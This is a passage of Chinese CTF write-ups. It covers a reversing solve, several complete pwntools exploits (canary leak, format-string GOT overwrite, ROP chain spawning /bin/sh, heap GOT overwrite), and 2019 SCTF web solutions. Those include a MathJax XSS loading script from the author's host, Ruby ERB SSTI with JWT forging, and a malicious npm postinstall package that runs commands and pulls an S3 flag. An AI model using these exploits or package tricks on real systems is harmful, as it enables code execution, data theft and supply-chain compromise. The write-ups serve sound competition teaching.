Watterson创造的，于是得到flag{小写名字}。 RE Re4newer 解题思路： Step1：die打开，发现有upx壳。 Step2：脱壳，执行upx -d 文件名即可。 Step3：IDA打开，shift+F12看字符串。 点进去，F5看伪代码如图。 Step4：逆算法。点进sub_401080可以看到关键函数的算法。 是简单的取字节异或，比较对象是v4-v14的值。 可以看到，这里可以分成44个两位16进制的数，并且顺序与箭头所指的数的大小有关。 Step4：得到flag。 pyhon脚本如下： a = [0x45,0x43,0x4E,0x44, 0x13,0x4A,0x76,0x59, 0x71,0x4B,0x7D,0x51, 0x54,0x7D,0x63,0x7D, 0x7D,0x5B,0x50,0x11, 0x52,0x4F,0x4B,0x51, 0x70,0x7D,0x47,0x4E, 0x67,0x67,0x70,0x70, 0x7D,0x57,0x7D,0x67, 0x71,0x51,0x63,0x52, 0x5F,0x56,0x13,0x7D] flag = '' for i in range(11): for j in [3,2,1,0]: flag += chr( a[i*4+j]^0x22) print(flag) PWN pwn100 把pwns100直接拖入ida中： main函数： base64解码函数 输入函数 可以看到read可以输入的字符串可以长达0x200个，这里可造成缓冲区溢出漏洞 这个程序很简单，输入base64字符串输出base64解码之后的字符串 先运行一下程序看一下这个程序干了啥 再看看程序开启了哪些保护: 因为这个程序开了Canary，这个题目的要利用printf泄露这个程序中的Canary，然后再泄露libc的基地址，最后利用溢出重新布置栈空间getshell，因为每次fork,子进程复制父进程的数据空间(数据段)、栈和堆，父、子进程共享正文段。也就是说，对于程序中的数据，子进程要复制一份，但是对于指令，子进程并不复制而是和父进程共享,具体可参考https://www.cnblogs.com/bwangel23/p/4190043.html 这个文章，所以虽然在泄露Canary或者libc的时候使子进程崩溃了，但是不会影响父进程的稳定性 所以我的exp是 #!/usr/bin/env python # -*- coding: utf-8 -*- __Auther__ = 'niexinming' from pwn import * import base64 context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug') def debug(addr = '0x08048B09'): raw_input('debug:') gdb.attach(io, \"b *\" + addr) local_MAGIC = 0x0003AC69 io = process('/home/h11p/hackme/huxiangbei/pwns') #io = remote('104.224.169.128', 18887) #debug() #getCanary payload = 'a'*0x102 io.recvuntil('May be I can know if you give me some data[Y/N]\\n') io.sendline('Y') io.recvuntil('Give me some datas:\\n') io.send(base64.b64encode(payload)) io.recvline() myCanary=io.recv()[268:271] Canary=\"\\x00\"+myCanary print \"Canary:\"+hex(u32(Canary)) #getlibc #debug() payload = 'a'*0x151 io.recvuntil('May be I can know if you give me some data[Y/N]\\n') io.sendline('Y') io.recvuntil('Give me some datas:\\n') io.send(base64.b64encode(payload)) io.recvline() mylibc=io.recv()[347:351] base_libc=u32(mylibc)-0x18637 print \"mylibc_addr:\"+hex(base_libc) #pwn #debug() MAGIC_addr=local_MAGIC+base_libc payload = 'a'*0x101+Canary+\"a\"*0xc+p32(MAGIC_addr) io.recvuntil('May be I can know if you give me some data[Y/N]\\n') io.sendline('Y') io.recvuntil('Give me some datas:\\n') io.send(base64.b64encode(payload)) io.interactive() io.close() 我讲解一下如何获取Canary，因为输入的输入数据会被printf输出，遇到0x00的时候停止输出，如果输入的输入刚刚好覆盖到Canary前面就可以用printf输出Canary了，但是Canary后两位是0x00,所以得到输出之后要补足后两位的0x00 同理也可以用这种方法计算出__libc_start_main和libc的基地址 计算出Canary的值和基地址后，就可以通过溢出让程序程序跳转到MAGIC去了，就可以getshell了，至于MAGIC是啥，大家可以翻一下我以前写的文章：http://blog.csdn.net/niexinming/article/details/78512274 最后的效果是： pwn200 把pwns100直接拖入ida中： main函数： sub_80485CD函数： 在sub_80485CD函数可以看到输入的数据直接进入了printf函数中，所以这个肯定是一个格式化字符串漏洞 先运行一下程序看一下这个程序干了啥 再看看程序开启了哪些保护: 这个程序开了Canary和栈不可执行 这个题目的思路和http://blog.csdn.net/niexinming/article/details/78512274 差不多，唯一不同的是上一个题目提供了system函数，这个题目要从libc中找system函数，所以首先通过printf打印__libc_start_main函数这个地址，然后根据偏移计算libc的基地址，然后计算出system的实际地址，最后用fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr})把atio的地址覆盖为system的地址，就可以getshell了 我的exp是： from pwn import * def debug(addr = '0x0804867E'): raw_input('debug:') gdb.attach(r, \"b *\" + addr) def base_addr(prog_addr,offset): return eval(prog_addr)-offset #localsystem = 0x0003ADA0 context(arch='i386', os='linux', log_level='debug') r = process('/home/h11p/hackme/huxiangbei/pwne') #r = remote('hackme.inndy.tw', 7711) elf = ELF('/home/h11p/hackme/huxiangbei/pwne') libc=ELF('/lib/i386-linux-gnu/libc.so.6') def exec_fmt(payload): r.recvuntil('WANT PLAY[Y/N]\\n') r.sendline('Y') r.recvuntil('GET YOUR NAME:\\n') r.recvuntil('\\n') r.sendline(payload) info = r.recv().splitlines()[1] print \"info:\"+info r.sendline('10') #r.close() return info autofmt = FmtStr(exec_fmt) r.close() r = process('/home/h11p/hackme/huxiangbei/pwne') atoi_got_addr = elf.got['atoi'] print \"%x\" % atoi_got_addr system_offset_addr = libc.symbols['system'] print \"%x\" % system_offset_addr payload1=\"%35$p\" #debug() r.recvuntil('WANT PLAY[Y/N]\\n') r.sendline('Y') r.recvuntil('GET YOUR NAME:\\n') r.recvuntil('\\n') r.sendline(payload1) libc_start_main = r.recv().splitlines()[1] libc_module=base_addr(libc_start_main,0x18637) system_addr=libc_module+system_offset_addr print \"system_addr:\"+hex(system_addr) r.sendline('10') payload2 = fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr}) r.recvuntil('WANT PLAY[Y/N]\\n') r.sendline('Y') r.recvuntil('GET YOUR NAME:\\n') r.recvuntil('\\n') r.sendline(payload2) r.recv() #r.sendline('10') r.sendline('/bin/sh') r.interactive() r.close() 效果是： pwn300 把pwn300直接拖入ida中： main函数： add函数： 这个题目很有意思，首先开辟一个3到255大小的堆空间，然后做加减乘除的计算之后把计算结果放入堆中，最后可以把所有的计算结果用memcpy函数全部放入函数的临时变量v5中也就是栈中，这样就会造成栈溢出 先运行一下程序看一下这个程序干了啥： 再看看程序开启了哪些保护: 看到这个程序开了栈不可执行，于是肯定就会想到用rop来做 这个题目用ida打开之后发现有很多函数，所以判断这个题目是静态编译的 所以可以用http://blog.csdn.net/niexinming/article/details/78259866 中我提到的ROPgadget工具来做，不出意外，很成功的找了完整的rop链 这个题目还有个难点就是不能直接输入十六进制，所以根据http://blog.csdn.net/niexinming/article/details/78666941 我的这篇文件可以用ctypes.c_int32(0x123).value进行转换 所以我的exp是： #!/usr/bin/env python # -*- coding: utf-8 -*- __Auther__ = 'niexinming' from pwn import * import binascii import ctypes as ct from struct import pack context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug') def debug(addr = '0x08048ff5'): raw_input('debug:') gdb.attach(io, \"b *\" + addr) def base_addr(prog_addr,offset): return eval(prog_addr)-offset elf = ELF('/home/h11p/hackme/huxiangbei/pwn300') io = process('/home/h11p/hackme/huxiangbei/pwn300') p=[] p.append( 0x0806ed0a) # pop edx ; ret p.append( 0x080ea060) # @ .data p.append( 0x080bb406) # pop eax ; ret p.append(eval('0x'+binascii.b2a_hex('nib/'))) p.append( 0x080a1dad) # mov dword ptr [edx], eax ; ret p.append( 0x0806ed0a) # pop edx ; ret p.append( 0x080ea064) # @ .data + 4 p.append( 0x080bb406) # pop eax ; ret p.append(eval('0x'+binascii.b2a_hex('hs//'))) p.append(0x080a1dad) # mov dword ptr [edx], eax ; ret p.append(0x0806ed0a) # pop edx ; ret p.append(0x080ea068) # @ .data + 8 p.append(0x08054730) # xor eax, eax ; ret p.append(0x080a1dad) # mov dword ptr [edx], eax ; ret p.append(0x080481c9) # pop ebx ; ret p.append(0x080ea060) # @ .data p.append(0x0806ed31) # pop ecx ; pop ebx ; ret p.append(0x080ea068) # @ .data + 8 p.append(0x080ea060) # padding without overwrite ebx p.append(0x0806ed0a) # pop edx ; ret p.append(0x080ea068) # @ .data + 8 p.append(0x08054730) # xor eax, eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x0807b75f) # inc eax ; ret p.append(0x08049781) # int 0x80 tempnum=0 #debug() io.recvuntil('How many times do you want to calculate:') io.sendline('255') for i in xrange(0,16): io.recvuntil('5 Save the result\\n') io.sendline('1') io.recvuntil('input the integer x:') io.sendline(str(tempnum)) io.recvuntil('input the integer y:') io.sendline('0') for j in p: io.recvuntil('5 Save the result\\n') io.sendline('1') io.recvuntil('input the integer x:') io.sendline(str(ct.c_int32(j).value)) io.recvuntil('input the integer y:') io.sendline('0') io.recvuntil('5 Save the result\\n') io.sendline('5') io.interactive() io.close() 注意一点就是，就是程序在return 0之前会调用free，而为了保证free函数的正常运行，前十六次计算的结果必须为0，后面的计算结果就可以随意了 最后getshell的效果是： pwn400 把pwn400直接拖入ida中：main函数： Create Profile函数： Print Profile函数： Update Profile函数： Exchange函数： 这个题目有点难度，我花了三天才搞定，题目的流程不难，首先创建Profile，当名字的长度小于8的时候会把数据写入bss段，数据的长度值nbytes会放入数据的后面，大于8的时候会malloc一个空间，把输入写入堆中，而指针会保存在bss段，而数据的长度值nbytes也会保存在指针的后面，更新Profile的时候也会做相同的操作，打印数据的时候会把名字输出，可以用这个功能泄露程序任意地址的任意数据，Exchange可以交换两个地址的数据，可以利用这个来getshell先运行一下程序看一下这个程序干了啥： 再看看程序开启了哪些保护: 看到这个程序开了栈不可执行，于是肯定就会想到用rop来做 这个程序有两个地方可以利用： （1）是创建的Profile，名字长度如果小于8就把数据写入bss段中，但是你可以输入负数，如果是负数的话，就可以造成整数溢出，你就可以在bss段中写入任意长度的数据，就可以覆盖后面的长度值nbytes为任意数值，这样你可以伪造一个任意长度的数据，在print函数中可以看到如果nbytes长度小于8就去读bss中的数据，如果nbytes大于8就会去读bss中的指针指向的数据，如果我们伪造nbytes的话就可以让print Profile函数去读任意地址的数据，通过got表可以计算出libc的基地址 （2）是Exchange函数可以交换任意两个指针，但是两个指针都是要有写权限的，程序中权限可以通过vmmap来查看 这个地方是难点，解决方法是：用top_chunk 指针和read@got指针进行交换，第二次堆分配时候可以分配到我想要的位置，就可以把想要数据写入read@got中，当下回调用read的时候就可以跳到MAGIC中getshell了，关于top_chunk的介绍可以参考https://www.cnblogs.com/alisecurity/p/5486458.html 我的exp #!/usr/bin/env python # -*- coding: utf-8 -*- __Auther__ = 'niexinming' from pwn import * import binascii context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug') localMAGIC=0x5fbc6 localmain_arena=0x001B2780 def debug(addr = '0x08048BA6'): raw_input('debug:') gdb.attach(io, \"b *\" + addr) def base_addr(prog_addr,sysmbol,offset): if sysmbol=='min': return eval(prog_addr)-offset else: return eval(prog_addr) + offset def cr_up_profile(choose,name_len,name,age): io.recvuntil('>') io.send(choose) io.recv() io.sendline(name_len) io.recvuntil('Input your name:\\n') io.sendline(name) io.recvuntil('Input your age:\\n') io.sendline(age) def print_profile(address): io.recvuntil(\">\") io.sendline('2') data = io.recv().splitlines()[0][11:15][::-1] log.info(\"%#x => %s\" % (address, (data or '').encode('hex'))) return data def change_age(address1,address2): io.sendline('4') io.recvuntil('Person 1:') io.send(p32(address1)) io.recvuntil('Person 2:') io.send(p32(address2)) def leak(address): payload = p32(address) + 'a' * 4 + p32(10) cr_up_profile('3','-10',payload,'10') return print_profile(address) def getshell(address1,address2,address3): change_age(address1,address2) cr_up_profile('3','20',address3,'20') #libc addr libc=ELF('/lib/i386-linux-gnu/libc.so.6') symbols = ['environ', '_environ', '__environ'] for symbol in symbols: environ = libc.symbols[symbol] print \"environ:\"+hex(environ) head=libc.symbols['__curbrk'] print \"head:\"+hex(head) system=libc.symbols['system'] print \"system:\"+hex(system) __malloc_hook=libc.got['__malloc_hook'] print \"__malloc_hook:\"+hex(__malloc_hook) #profile addr elf = ELF('/home/h11p/hackme/huxiangbei/profile') printf_addr=elf.got['printf'] puts_addr=elf.got['puts'] atoi_addr=elf.got['atoi'] malloc_addr=elf.got['malloc'] __isoc99_scanf_addr=elf.got['__isoc99_scanf'] read_addr=elf.got['read'] print \"printf_addr:\"+hex(printf_addr) print \"puts_addr:\"+hex(puts_addr) print \"atoi_addr:\"+hex(atoi_addr) print \"malloc_addr:\"+hex(malloc_addr) print \"__isoc99_scanf_addr:\"+hex(__isoc99_scanf_addr) print \"read_addr:\"+hex(read_addr) io = process('/home/h11p/hackme/huxiangbei/profile') #debug() #create profile cr_up_profile('1','10','a'*8,'1'*12) #leak libc base libc_base=base_addr(\"0x\"+binascii.b2a_hex(leak(printf_addr)),'min',0x49670) #0x49670 #get libc func addr print \"libc_base:\"+hex(libc_base) MAGIC_addr=libc_base+localMAGIC print \"MAGIC_addr:\"+hex(MAGIC_addr) environ_addr=libc_base+environ print \"environ_addr:\"+hex(environ_addr) head_addr=libc_base+head print \"head_addr:\"+hex(head_addr) main_arena_addr=libc_base+localmain_arena print \"main_arena_addr:\"+hex(main_arena_addr) topchunk=main_arena_addr+0x30 print \"topchunk:\"+hex(topchunk) system_addr=libc_base+system print \"system_addr:\"+hex(system_addr) __malloc_hook_addr=libc_base+__malloc_hook print \"__malloc_hook_addr:\"+hex(__malloc_hook_addr) ''' libc_start_main=base_addr(\"0x\"+binascii.b2a_hex(leak(environ_addr)),'min',0xa0) print \"libc_start_main:\"+hex(libc_start_main) head_addr_input=base_addr('0x'+binascii.b2a_hex(leak(head_addr+1))+'00','min',0x20fe8) print \"head_addr_input:\"+hex(head_addr_input) ''' #getshell getshell(topchunk-0xc,0x0804B004-0x8,'a'*8+p32(MAGIC_addr)) io.interactive() io.close() 效果是： Ps:寻找MAGIC可以用one_gadget这个工具，工具地址在： https://github.com/david942j/one_gadget 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-19 19:43:41 0 issues reported "},"articals/2019sctf.html":{"url":"articals/2019sctf.html","title":"2019SCTF","keywords":"","body":"2019SCTF 题目类型： 类型 年份 难度 官方赛事题 2019 难 题目下载： 暂无 网上公开WP: https://www.xctf.org.cn/library/details/e79537ac55b532b974acc27ae514480068344dca/ https://www.zhaoj.in/read-5985.html https://xz.aliyun.com/t/5478 https://xz.aliyun.com/t/5474 https://www.anquanke.com/post/id/181019 本站备份WP 感谢作者：glazjin、SU、De1ta Web math-is-fun1 知识点：利用外部组件进行的反射型 XSS 步骤： 1.打开靶机，是这样一个页面。 似乎要提交给管理员页面来看，页面没看到有可以提交进行储存的地方。 2.然后来看看页面源码。 这个地方似乎可控，来试试。 Nice，可以。 3.再来看看下面的 js。 可以看到，其对 config 进行解析，首先处理换行，而后对其进行解析 -config['name']=value会被赋值到 window 的config里的 name value。 -name=value的会被赋值到 window 的 name，值为 value。 4.那么看看有什么地方读了 window 的，可以看到这里加载了 mathjax 来处理数学公式的显示。 5.点击进去看看源码，搜索 window，还真调用了。 可以看到其在初始化时将 window 里已有的 MathJax 存到自身的 AuthorConfig 里，而后其会读取这个设置，将里面的 root 作为组件的 root 进行设置。 那么就好办了，我们就构造一个参数，使其从我们的网站上加载我们的 js，这样想做啥都可以了，很棒的是这样加载不受 CSP 之类的限制，美滋滋。 6.构造如下， http://47.110.128.101/challenge?name=glzjin%3b%0aMathJax%3d%7b”root”%3a”http%3a%2f%2fxss.zhaoj.in%2fmath”%7d name那里其实为 glzjin; MathJax={\"root\":\"http://xss.zhaoj.in/math\"} 这样就达到我们之前想达到的目的了。 7.把这个链接打过去，就可以看到 XSSBOT 加载了什么资源了。 祖传算号器： import string, hashlib a = string.digits + string.lowercase + string.uppercase for i in a: for j in a: for k in a: for m in a: s = hashlib.md5(i + j + k + m).hexdigest()[0:5] if s == \"5e86c\": print(i + j + k + m) exit(0) 打 看我自己服务器日志，得 说明：这里其实我原本是直接在浏览器上看了看资源加载，没想到正常版的 Chrome 和 XSSBOT 的 headless Chrome 还有所不同，正常版 Chrome 加载的资源和 headless 的不同，错失一血- 8.在服务器上创建一个这个路径的文件， 9.再打一遍。收 XSS。 10.Flag 到手~ math-is-fun2 同上一题，不再赘述 flag shop 知识点：Ruby ERB SSTI 备注：Ruby 摸得少，搜了一个下午都没搜到 Ruby 的全局变量 – -后来结束了和出题人 evoA 师傅一聊才知道得用美元符号的全局变量，哭了。在这里也还是写写 WriteUp 记录下。 步骤： 1、打开靶机，发现是这样一个页面。 2、看下页面源码，主要关注后面这一段，先获取信息，失败就去请求 auth。 auth 之后会得到一个 jwt token。看来之后的请求我们也得带上这个。 2、扫下敏感文件，有 robots.txt。 3、访问一下这个路径，是源码。 require 'sinatra' require 'sinatra/cookies' require 'sinatra/json' require 'jwt' require 'securerandom' require 'erb' set :public_folder, File.dirname(__FILE__) + '/static' FLAGPRICE = 1000000000000000000000000000 #ENV[\"SECRET\"] = SecureRandom.hex(xx) configure do enable :logging file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\") file.sync = true use Rack::CommonLogger, file end get \"/\" do redirect '/shop', 302 end get \"/filebak\" do content_type :text erb IO.binread __FILE__ end get \"/api/auth\" do payload = { uid: SecureRandom.uuid , jkl: 20} auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth end get \"/api/info\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]}) end get \"/shop\" do erb :shop end get \"/work\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } auth = auth[0] unless params[:SECRET].nil? if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\") puts ENV[\"FLAG\"] end end if params[:do] == \"#{params[:name][0,7]} is working\" then auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth ERB::new(\"&lt;script>alert('#{params[:name][0,7]} working successfully!')&lt;/script>\").result end end post \"/shop\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } if auth[0][\"jkl\"] &lt; FLAGPRICE then json({title: \"error\",message: \"no enough jkl\"}) else auth &lt;&lt; {flag: ENV[\"FLAG\"]} auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth json({title: \"success\",message: \"jkl is good thing\"}) end end def islogin if cookies[:auth].nil? then redirect to('/shop') end end 4、可以看到 /work 那里有 ERB 模板，还直接把可控参数 name 拼进去了，那么这里我们就可以传入一些构造过的参数，来达到我们的目的了。比如 name=，就会得 1。 5、 继续看看源码，同时注意有这样一段意义不明的代码。似乎得传入 SECRET 参数。那么就一起带上。 unless params[:SECRET].nil? if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\") puts ENV[\"FLAG\"] end end 5、对照 Ruby 全局变量表 ，不断 fuzz，发现$`有东西， 回溯到源码看看 unless params[:SECRET].nil? if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\") puts ENV[\"FLAG\"] end end 其在模板渲染之前之前有个匹配，就是这里。要是 SECRET 参数存在则对其进行匹配，用传入的这个值去和 ENV[\"SECRET\"] 匹配，匹配上了就往终端输出 FLAG。意义不明的代码，但这里既然有匹配，就可以用全局变量读出来了，也就是用 $` 来读取匹配前的内容。 那么这里读出来的就是 ENV 的 SECRET 的一部分了。 6、然后我们 SECRET 不传试试，这样括号里的匹配就不进行，只进行括号外的 ENV[“SECRET”] 的匹配，再用全局变量 $` 就可以读出 ENV[“SECRET”] 了。 7、拿到了 secret 之后，到 jwt.io 伪造一下 cookie 里的 auth 里存的 jwt 令牌。jkl 设置为 2000000000000000000000000000 。 8、置 cookie，买 flag。 9、然后再解析一下新的 jwt token。 10、Flag 到手~ easy-web 知识点：RCE点找寻（预期解），NPM 包特性（非预期解） 备注：这题做出来之后和出题人 l0ca1 师傅聊了聊，发现是有 RCE 点的，在传入包名那- -不过到后面我这种蛇皮做法个人觉得反倒还方便些。以下我就写写自己的方法吧。 步骤： 1、打开靶机，是这样一个页面。 2、看看源码，是 vue 写的。 3、看下 app.js，找出其中的接口。 4、分析文件， 看到如下几个点 提示 {\"npm\":[\"jquery\",\"moment\"]} ,其功能为下载 npm包打包之后提供二次下载。 提示 key 为 abcdefghiklmn123，接口地址 /upload。 经过观察，测试，得到该接口的正确用法： 5、然后参考 https://juejin.im/post/5971aa866fb9a06bb5406c94 自己来构造一个包，里面不需要有实际内容，主要利用 npm 包 package json 里 script 段的 postinstall 配置，这种攻击在现实中也出现过。https://www.anquanke.com/post/id/85150 构建步骤： > mkdir glzjintest1 >cd glzjintest1 >npm init1 新建一个 index.js，内容如下 exports.showMsg = function () { console.log(\"This is my first module\"); }; 编辑 package.json， { \"name\": \"glzjintest1\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"postinstall\": \"grep -rn 'sctf' / > result.txt; exit 0\" }, \"author\": \"\", \"license\": \"ISC\" } 主要是改 scripts，postinstall 里面为你想执行的命令。这里我主要是想搜搜有没有 flag。 然后是推送包到 npmjs， > npm login > npm publish 6、然后请求靶机，让其下载这个包。 7、我们把返回的 URL 所指向的压缩包下载下来解压看看，可以看到我们的命令执行结果。没找到像 flag 的文件。 8、似乎 /var/task 是程序所在目录，打个包下下来看看。 继续修改 package.json，版本升级下，推包。 { \"name\": \"glzjintest1\", \"version\": \"1.0.3\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"postinstall\": \"tar cvzf result.tar.gz /var/task/; exit 0\" }, \"author\": \"\", \"license\": \"ISC\" } 然后继续让靶机下载咱们这个包。 解压 result.tar.gz 9、审计源码 index.js const koa = require(\"koa\"); const AWS = require(\"aws-sdk\"); const bodyparser = require('koa-bodyparser'); const Router = require('koa-router'); const async = require(\"async\"); const archiver = require('archiver'); const fs = require(\"fs\"); const cp = require(\"child_process\"); const mount = require(\"koa-mount\"); const cfg = { \"Bucket\":\"static.l0ca1.xyz\", \"host\":\"static.l0ca1.xyz\", } function getRandomStr(len) { var text = \"\"; var possible = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"; for (var i = 0; i &lt; len; i++) text += possible.charAt(Math.floor(Math.random() * possible.length)); return text; }; function zip(archive, output, nodeModules) { const field_name = getRandomStr(20); fs.mkdirSync(`/tmp/${field_name}`); archive.pipe(output); return new Promise((res, rej) => { async.mapLimit(nodeModules, 10, (i, c) => { process.chdir(`/tmp/${field_name}`); console.log(`npm --userconfig='/tmp' --cache='/tmp' install ${i}`); cp.exec(`npm --userconfig='/tmp' --cache='/tmp' install ${i}`, (error, stdout, stderr) => { if (error) { c(null, error); } else { c(null, stdout); } }); }, (error, results) => { archive.directory(`/tmp/${field_name}/`, false); archive.finalize(); }); output.on('close', function () { cp.exec(`rm -rf /tmp/${field_name}`, () => { res(\"\"); }); }); archive.on(\"error\", (e) => { cp.exec(`rm -rf /tmp/${field_name}`, () => { rej(e); }); }); }); } const s3Parme = { // accessKeyId:\"xxxxxxxxxxxxxxxx\", // secretAccessKey:\"xxxxxxxxxxxxxxxxxxx\", } var s3 = new AWS.S3(s3Parme); const app = new koa(); const router = new Router(); app.use(bodyparser()); app.use(mount('/static',require('koa-static')(require('path').join(__dirname,'./static')))); router.get(\"/\", async (ctx) => { return new Promise((resolve, reject) => { fs.readFile(require('path').join(__dirname, './static/index.html'), (err, data) => { if (err) { ctx.throw(\"系统发生错误,请重试\"); return; }; ctx.type = 'text/html'; ctx.body = data.toString(); resolve(); }); }); }) .post(\"/login\",async(ctx)=>{ if(!ctx.request.body.email || !ctx.request.body.password){ ctx.throw(400,\"参数错误\"); return; } ctx.body = {isUser:false,message:\"用户名或密码错误\"}; return; }) .post(\"/upload\", async (ctx) => { const parme = ctx.request.body; const nodeModules = parme.npm; const key = parme.key; if(typeof key == \"undefined\" || key!=\"abcdefghiklmn123\"){ ctx.throw(403,\"请求失败\"); return; } if (typeof nodeModules == \"undefined\") { ctx.throw(400, \"JSON 格式错误\"); return; } const zipFileName = `${getRandomStr(20)}.zip`; var output = fs.createWriteStream(`/tmp/${zipFileName}`, { flags: \"w\" }); var archive = archiver('zip', { zlib: { level: 9 }, }); try { await zip(archive, output, nodeModules); } catch (e) { console.log(e); ctx.throw(400,\"系统发生错误,请重试\"); return; } const zipBuffer = fs.readFileSync(`/tmp/${zipFileName}`); const data = await s3.upload({ Bucket: cfg.Bucket, Key: `node_modules/${zipFileName}`, Body: zipBuffer ,ACL:\"public-read\"}).promise().catch(e=>{ console.log(e); ctx.throw(400,\"系统发生错误,请重试\"); return; }); ctx.body = {url:`http://${cfg.host}/node_modules/${zipFileName}`}; cp.execSync(`rm -f /tmp/${zipFileName}`); return; }) app.use(router.routes()); if (process.env &amp;&amp; process.env.AWS_REGION) { require(\"dns\").setServers(['8.8.8.8','8.8.4.4']); const serverless = require('serverless-http'); module.exports.handler = serverless(app, { binary: ['image/*', 'image/png', 'image/jpeg'] }); }else{ app.listen(3000,()=>{ console.log(`listening 3000......`); }); } 可以看到包是存在 亚马逊 s3 上的，而且在最后几行可以看出这个程序似乎是跑在亚马逊的 serverless 服务上的。 10、那么就来写个 nodejs 看看 s3 的 bucket 里有啥吧，把我们的包改下。 package.json 改为如下内容，版本升级，依赖加上，命令执行上。 { \"name\": \"glzjintest1\", \"version\": \"1.0.7\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"postinstall\": \"cp index.js ../../test.js &amp;&amp; cd ../../ &amp;&amp; node test.js > result.txt; exit 0\" }, \"author\": \"\", \"license\": \"ISC\", \"dependencies\": { \"aws-sdk\": \"^2.449.0\" } } 命令那里我复制到上上级 – -为了不重复下载依赖- -使得包太大。 index.js 改为如下内容： const AWS = require(\"aws-sdk\"); const s3Parme = { // accessKeyId:\"xxxxxxxxxxxxxxxx\", // secretAccessKey:\"xxxxxxxxxxxxxxxxxxx\", } var s3 = new AWS.S3(s3Parme); // Create the parameters for calling listObjects var bucketParams = { Bucket : 'static.l0ca1.xyz', }; // Call S3 to obtain a list of the objects in the bucket s3.listObjects(bucketParams, function(err, data) { if (err) { console.log(\"Error\", err); } else { console.log(\"Success\", data); } }); exports.showMsg = function () { console.log(\"This is my first module\"); }; 读出 s3 里存的东西，从 serverless 里连接是不需要凭证的。 然后让靶机下载这个包。 解压，看到开头有个 flag 文件。 11、继续更改 package.json，提升版本。 { \"name\": \"glzjintest1\", \"version\": \"1.1.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"postinstall\": \"cp index.js ../../test.js &amp;&amp; cd ../../ &amp;&amp; node test.js > result.txt; exit 0\" }, \"author\": \"\", \"license\": \"ISC\", \"dependencies\": { \"aws-sdk\": \"^2.449.0\" } } 然后修改 index.js，为其添加读取这个 flag 文件的代码。 const AWS = require(\"aws-sdk\"); const s3Parme = { // accessKeyId:\"xxxxxxxxxxxxxxxx\", // secretAccessKey:\"xxxxxxxxxxxxxxxxxxx\", } var s3 = new AWS.S3(s3Parme); // Create the parameters for calling listObjects var bucketParams = { Bucket : 'static.l0ca1.xyz', }; // Call S3 to obtain a list of the objects in the bucket s3.listObjects(bucketParams, function(err, data) { if (err) { console.log(\"Error\", err); } else { console.log(\"Success\", data); } }); var fileParam = { Bucket : 'static.l0ca1.xyz', Key: 'flaaaaaaaaag/flaaaag.txt' }; s3.getObject(fileParam, function(err, data) { if (err) console.log(err, err.stack); // an error occurred else console.log(data); // successful response }); exports.showMsg = function () { console.log(\"This is my first module\"); }; 推包，让靶机下载。 下载回来，解压，得到文件内容。 解码下就是 flag。 12、Flag 到手~ babyEoP 出题人：Jaylin 解题人数：0 最终分数：1000 题目给了一个webshell，弱密码直接进去。 Tomcat启用了 Security Manager，webshell基本所有功能无法正常使用，但是可以查看有限的几个目录文件，无写权限。 如果顺利，应该可以收集到以下信息： cookie处存在反序列化的点，有反序列化漏洞。 查看lib目录，存在 commons-collections 3.1 gadget。 找到 catalina.policy 文件，是Tomcat默认的安全策略配置文件，这应该是本题可能有点脑洞的地方，因为没有给 C:/babyEoP/apache-tomcat-8.5.42 的读权限，所以无法列目录，但是 conf 目录是可读的。（有将近10位选手读到了这个文件hhhh。） 我在官方提供的 catalina.policy 的基础上，做了一些修改。给了 LoadLibrary 、 createClassLoader、 accessDeclaredMembers 几个重要权限。 分析 policy ，应该很容易可以想到，要通过 JNI 绕过 Security Manager。但是 JNI 需要加载一个 dll 动态链接库，由于并没有给任何写权限，所以是不可能上传 dll 的。 并且，webshell 的 Eval Code 使用时，需要向当前目录写一个 tmp.jsp 文件，所以也是不能用的（不要想着用这个执行代码）。 那么该如何才能执行代码来加载一个不在本地的dll呢？ 下面是具体的解题思路： 题目已经给了反序列化的点以及gadget，可以通过这个来执行代码。 ysoserial 的 commons-collections 利用链提供了几个直接执行命令的 gadget，但是都是基于 Runtime.exec 的，并没有给这个权限。So 想要直接利用是不行的。 但是直接用 gadget 构造出加载dll可能比较困难，所以这里可以利用稍微高级一点的方法——加载外部的jar来执行代码。 构造见https://github.com/Jayl1n/ysoserial/blob/master/src/main//ysoserial/payloads/CommonsCollections8. 下面要加载 dll，用 JNI 绕 JSM。 同样因为没有写权限，且 dll 无法一起打包到 